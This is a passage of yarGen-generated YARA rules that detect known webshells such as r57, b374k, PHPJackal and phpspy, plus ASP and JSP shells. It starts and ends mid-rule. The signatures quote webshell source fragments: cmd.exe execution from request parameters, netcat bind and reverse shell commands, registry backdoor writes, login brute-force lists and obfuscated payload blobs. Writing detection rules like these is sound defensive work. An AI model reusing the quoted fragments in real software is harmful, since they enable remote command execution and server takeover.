      hash27 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash28 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash29 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash30 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash31 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash32 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $x1 = "Process pro = Runtime.getRuntime().exec(command);" fullword ascii
      $s2 = "Process pro = Runtime.getRuntime().exec(program);" fullword ascii
      $s3 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
      $s4 = "Process process = Runtime.getRuntime().exec(program);" fullword ascii
      $s5 = "program = \"cmd.exe\";" fullword ascii
      $s6 = "} else if (o != null && o.equals(\"vLogin\")) {" fullword ascii
      $s7 = "public void setPro(Process p) {" fullword ascii
      $s8 = "private static class VLoginInvoker extends DefaultInvoker {" fullword ascii
      $s9 = "private Process pro;" fullword ascii
      $s10 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v " ascii
      $s11 = "private OnLineProcess ol = null;" fullword ascii
      $s12 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\RAdmin\\\\v2.0\\\\Server\\\\Parameters\\\\\\\" /v \\\"Parameter\\\"" ascii
      $s13 = "Object online = JSession.getAttribute(SHELL_ONLINE);" fullword ascii
      $s14 = "Object o = JSession.getAttribute(SHELL_ONLINE);" fullword ascii
      $s15 = "if (!Util.isEmpty(target) && !Util.isEmpty(src)) {" fullword ascii
      $s16 = "return f1.getName().compareTo(f2.getName());" fullword ascii
      $s17 = "this.cmd = c;" fullword ascii
      $s18 = "Object remotePort = JSession.getAttribute(\"remotePort\");" fullword ascii
      $s19 = "private static class PortScanInvoker extends DefaultInvoker {" fullword ascii
      $s20 = "private static String SHELL_NAME = \"\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_27 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash8 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s2 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s3 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s4 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii
      $s5 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii
      $s6 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii
      $s7 = "$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \\''.$_POST['s_mask'].'\\' | xargs grep -E \\''.$_POST['s_text'].'\\'';" fullword ascii
      $s8 = " $_POST['cmd']=\"echo \\\"Now script try connect to \".$_POST['ip'].\" port \".$_POST['port'].\" ...\\\"\";" fullword ascii
      $s9 = " $_POST['cmd']=\"ps -aux | grep dpc\";" fullword ascii
      $s10 = " $_POST['cmd']=\"ps -aux | grep dp\";" fullword ascii
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['t" ascii
      $s12 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mk\")" fullword ascii
      $s13 = "echo sr(40,\"<b>\".$lang[$language.'_text13'].$arrow.\"</b>\",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR'" ascii
      $s14 = "if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == \"search_text\")" fullword ascii
      $s15 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['t" ascii
      $s16 = "if(!empty($_POST['cmd']) && $_POST['cmd'] == \"find_text\")" fullword ascii
      $s17 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ch_\")" fullword ascii
      $s18 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"save_file\")" fullword ascii
      $s19 = ".txt;.php;.htm )\".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));" fullword ascii
      $s20 = "if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']==\"C\"))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _404_data02_Jsp_suiyue_28 {
   meta:
      description = "webshell - from files 404.jsp, data02.jsp, Jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
      hash3 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $x1 = "  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = " Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = "  /** Convenience method to read HTTP header lines */" fullword ascii
      $s4 = "  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s5 = " String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s6 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s7 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s8 = "  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s9 = "        line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s10 = "      line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s11 = "  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s12 = " return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s13 = "  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s14 = " int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
      $s15 = " if (ht.get(\"cqqUploadFile\") != null)" fullword ascii
      $s16 = "  response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
      $s17 = " String strContent=request.getParameter(\"content\");" fullword ascii
      $s18 = " int clength = request.getContentLength();" fullword ascii
      $s19 = "   sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+" ascii
      $s20 = "   sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2006_lnc_29 {
   meta:
      description = "webshell - from files shell.php, phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash3 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $s2 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $s3 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s4 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $s6 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s7 = "if ($_POST['do'] == 'login') {" fullword ascii
      $s8 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s9 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s10 = "$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" ascii
      $s11 = "$proxycontents = @file_get_contents($_POST['url']);" fullword ascii
      $s12 = "$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'" ascii
      $s13 = "$dbpassword = $_POST['dbpassword'];" fullword ascii
      $s14 = "} elseif ($execfunc==\"wscript\") {" fullword ascii
      $s15 = ": '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s16 = "<input type=\"hidden\" name=\"do\" value=\"login\">" fullword ascii
      $s17 = "$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';" fullword ascii
      $s18 = "if ($_POST['backuptype'] == 'download') {" fullword ascii
      $s19 = "$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);" fullword ascii
      $s20 = "function formheader($action='',$title,$target='') {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_asp__1__vps_30 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash4 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
      $x2 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
      $x3 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
      $x4 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
      $s5 = "Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targetip & \"" ascii
      $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
      $s8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
      $s9 = "xPost3.Send loginuser & loginpass & mt & deluser & quit " fullword ascii
      $s10 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
      $s11 = "1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err The" ascii
      $s12 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
      $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
      $s14 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
      $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Symantec\\\\pcAnywhere\\\\\"" ascii
      $s16 = "ws\\\\Temp\\\\\"\")'>Temp</a>m?<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>v,<a href='javascript:Sho" ascii
      $s17 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
      $s18 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Microsoft\\\\Media Index" ascii
      $s19 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
      $s20 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule ____1__31 {
   meta:
      description = "webshell - from files .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash2 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
      $x3 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $x4 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $x5 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
      $x6 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
      $s7 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s8 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $s9 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s10 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $s11 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s13 = "set dd=cm.exec(shellpath&\" /c \"&defcmd)" fullword ascii
      $s14 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
      $s15 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"&chr(13)&chr" ascii
      $s16 = "t:if request(\"cmdx\")=\"cmd.exe\" then" fullword ascii
      $s17 = "ion='http://webshell.org/web/where/ip.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor=" ascii
      $s18 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s19 = "call ws.run (shellpath&\" /c \" & defcmd & \" > \" & sztempfile, 0, true)" fullword ascii
      $s20 = "cycler\\\"&chr(13)&chr(10)&\"e:\\recycler\\\"&chr(13)&chr(10)&\"f:\\recycler\\\"&chr(13)&chr(10)&\"C:\\wmpub\\\"&chr(13)&chr(10)" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _radhat__32 {
   meta:
      description = "webshell - from files radhat.asp, .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
      hash2 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
   strings:
      $s1 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s2 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s3 = "'(7VXdKZE!(dX;KVPocV)Vo4!(dX{)Vo4,K7P2ZE(y5C KZXoEKPd};)(oc4cV.7Vd;''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+" ascii
      $s4 = "','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4;D,'gGmhg_1pG','cwZHYZU`&fX4&`wKxj','4cK`&L7w&`XtKp\\W.O\\ocF\\odZ4ZV" ascii
      $s5 = "};]D[)'*'(oX2f4.f7iVo4=f7iVo4;]W[)'*'(oX2f4.Vo4=Vo4{)D- =!)'*'(dmYcwKX.Vo4&&Vo4(dX;cP2xS.rcZ.7Vd=Uf7iVo4;Vo4=f7iVo4 VxS;Uf7iVo4 " ascii
      $s6 = "\\4c2Xd 7xVtZVf\\:Y`&Vy&`\\oZZVbbb\\yPfocKX\\:Y`&Vy&`\\oPfKaUhPZtZj\\4c2XQ 7xVtZV8\\:Y`&Vy&`VxV.Lxy\\:Y`&Vy&`\\CVcSZEcG\\:Y`&Vy&" ascii
      $s7 = ">``]EKr[ 7ZVd * oEc2c4``=cP2xS KZXofZ<` " fullword ascii
      $s8 = "\\4Vc4B 22J\\4tKXoocj wKx 4oKc7PEZg\\:Y`&Vy&`cYc.oKcX2ENT\\o4ZTNT\\:Y`&Vy&`f4x.2VP\\4c4xyxoxw\\o4ZTNT\\:Y`&Vy&`cYc.2ZZoOAXz\\jhm" ascii
      $s9 = "\\4c2Xd 7xVtZVf\\:Y`&Vy&`\\oZZVbbb\\yPfocKX\\:Y`&Vy&`\\oPfKaUhPZtZj\\4c2XQ 7xVtZV8\\:Y`&Vy&`VxV.Lxy\\:Y`&Vy&`\\CVcSZEcG\\:Y`&Vy&" ascii
      $s10 = " VcSVcj l9j + 44cEEJ`,`}4${`,5LS(cEx2fcG r" fullword ascii
      $s11 = "\\:Y`&Vy&`VxV.oZZVbbb\\:Y`&Vy&`VxV.fod\\:Y`&Vy&`\\" fullword ascii
      $s12 = "`,`KZooPy`,`};)(oX7yP4.7VZd.4XTo;'cSx4'=cP2xS.Txw.7VZd.4XTo{))'." fullword ascii
      $s13 = "(c2XQoYcicoxcVn.dNZ" fullword ascii
      $s14 = "`,`KZooPy`,`)(oX7yP4.7VZd.4XTo;'cVf'=cP2xS.Txw.7VZd.4XTo:^`LrK" fullword ascii
      $s15 = "`,`KZooPy`,`)'W','dCy'(otE;cP2xS.2oS.7VZd.4XTo=cP2xS.254.7VZd.4XTo;''=cP2xS.btP.7VZd.4XTo:^`(XVd&` >xcVxoYco/<` & )254(b5x & `>'" ascii
      $s16 = "`,`KZooPy`,`)'dooo'(bLb;'o4Zf'=cP2xS.xXt:^`LrK" fullword ascii
      $s17 = "`,`KZooPy`,`)'CCTE'(bLb;'YN'=cP2xS.45;'`&))Y&`.o4co`(Tox8fxH.VcSVcj&`|`&)X(LwL(YC2&`'=cP2xS.yKb:^KZooZy`(XVd,`E`5rP" fullword ascii
      $s18 = "S.dEP.7VZd.4XTo};'LEZ2y'=Cx2f4Xw.c2Co4.D4;'cKZK'=Cx2f4Xw.c2Co4.W4{c42c};'cKZK'=Cx2f4Xw.c2Co4.D4;'LEZ2y'=Cx2f4Xw.c2Co4.W4{)'4:254" ascii
      $s19 = "coXVbtcV_fY>``;)');oZP5&f7o.EKr 2cw&&f7o.zDeu 2cw E/ cYc.w7E;oZP5&(22cT4 oEc2c4','yw7.4xX\\4xX\\Aq`&fyt&`7co4C4\\oKKXb\\:E=c4xyx" ascii
      $s20 = ";''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+K7P2ZE=cP2xS.7xVxf.7Vd;'2cw'=cP2xS.Txw.7Vd;)(oc4cV.7Vd;KVPocV))'?" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_3_33 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "q99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wS" ascii
      $s2 = "elseif($split[0]==\"back\") $rstarget_packed = $rsport_.\" \".$rshost_;" fullword ascii
      $s3 = "if($split[0]==\"bind\") $rstarget_packed = $rsport_;" fullword ascii
      $s4 = "header(\"Content-type: text/javascript\");" fullword ascii
      $s5 = "setcookie(\"b374k\",$login,time() + $s_login_time);" fullword ascii
      $s6 = "// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php this was used with bind and reverse shell" fullword ascii
      $s7 = "$scriptout = $s_win ? $script.\".exe\" : $script;" fullword ascii
      $s8 = "$result = exe($runlang.\" \".$fpath.\" \".$rstarget);" fullword ascii
      $s9 = "$rs_win = \"7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/fe" ascii
      $s10 = "if(!$d = getenv(\"TMP\")) if(!$d = getenv(\"TEMP\")) if(!$d = getenv(\"TMPDIR\")){" fullword ascii
      $s11 = "kqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fU" ascii
      $s12 = "5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJmSy" ascii
      $s13 = "MRArCX47adffqZ7w3W7evdrRq/uyLvff7y9Wg1utK3StehSqINrEWJsS0PXWeA6C24CJruOM8PLuw79U1FFTPadicYSY0qz+K/phChKxvInBCsI7b9BONGVeH6c8gb4p" ascii
      $s14 = "file_put_contents($script, $code);" fullword ascii
      $s15 = "if(function_exists(\"posix_kill\")) $buff = (posix_kill($p,'9'))? \"Process with pid \".$p.\" has been successfully killed\":\"U" ascii
      $s16 = "while ($se = fgets($pipes[2])) {" fullword ascii
      $s17 = "if(function_exists(\"posix_kill\")) $buff = (posix_kill($p,'9'))? \"Process with pid \".$p.\" has been successfully killed\":\"U" ascii
      $s18 = "o kill process with pid \".$p;" fullword ascii
      $s19 = "if(strtolower(trim($s_pass)) == $login){" fullword ascii
      $s20 = "file_put_contents($script.\".java\", $code);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHPJackal_PHPJackal_v1_5_34 {
   meta:
      description = "webshell - from files PHPJackal.php, PHPJackal v1.5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "27c9cc91bc0a23939e526012b8b3355b8e1d2c460286595452cd2b7d750f9a16"
      hash2 = "ed597809fdcb90dabc0a555c39353982bae3c99703b81938a6e19923d0a75692"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $x4 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s5 = "function shelL($command){" fullword ascii
      $s6 = "if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die(\"<html><body><table><form method=post><tr><td>Passwo" ascii
      $s7 = "fputs($sock,\"RCPT TO: <contact@persianblog.com>\\r\\n\");" fullword ascii
      $s8 = "spliturL($_REQUEST['target'],$host,$page);" fullword ascii
      $s9 = "$packet=\"$method /$page HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nConnection: Close\\r\\nAu" ascii
      $s10 = "$packet=\"$method /$page HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nConnection: Close\\r\\nAu" ascii
      $s11 = "$res=snmpchecK($target,$com,2);" fullword ascii
      $s12 = "if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){" fullword ascii
      $s13 = "$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');" fullword ascii
      $s14 = "if(!empty($login_password)){" fullword ascii
      $s15 = "$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-lo" ascii
      $s16 = "fputs($sock,\"AUTH LOGIN\\r\\n\");" fullword ascii
      $s17 = "fputs($sock,\"$b LOGIN $username $password\\r\\n\");" fullword ascii
      $s18 = "function downloadiT($get,$put){" fullword ascii
      $s19 = "if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));" fullword ascii
      $s20 = "$url=$_REQUEST['target'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _gfs_sh_NetworkFileManagerPHP_35 {
   meta:
      description = "webshell - from files gfs_sh.php, NetworkFileManagerPHP.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
